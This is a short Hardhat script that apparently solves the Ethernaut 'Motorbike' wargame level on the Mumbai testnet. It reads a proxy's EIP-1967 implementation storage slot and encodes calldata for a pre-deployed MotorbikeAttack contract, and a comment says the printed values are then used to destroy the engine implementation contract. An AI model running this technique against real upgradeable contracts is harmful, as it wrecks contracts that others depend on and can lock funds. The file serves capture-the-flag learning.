const { ethers } = require("hardhat")

async function main() {
    // mumbai
    // pre-deploy MotorbikeAttack.sol using Remix

    const instance = "0x0B16E73a8c08Ba643447e8c08194a90b5C821E7C"
    const motorbikeAttack = await ethers.getContractAt(
        "MotorbikeAttack",
        "0xEA2e3d49C65F59AF71F7871C98C3bBe2461ba3A0"
    )

    const implementationSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
    const implementationSlotData = await ethers.provider.getStorageAt(instance, implementationSlot)
    const implementationAddress = "0x" + implementationSlotData.slice(26, 66)
    console.log("Implementation address:", implementationAddress)
    const data = motorbikeAttack.interface.encodeFunctionData("attack")
    console.log(data)

    // Use printed values to destroy engine implementation contract using Remix
}

main()
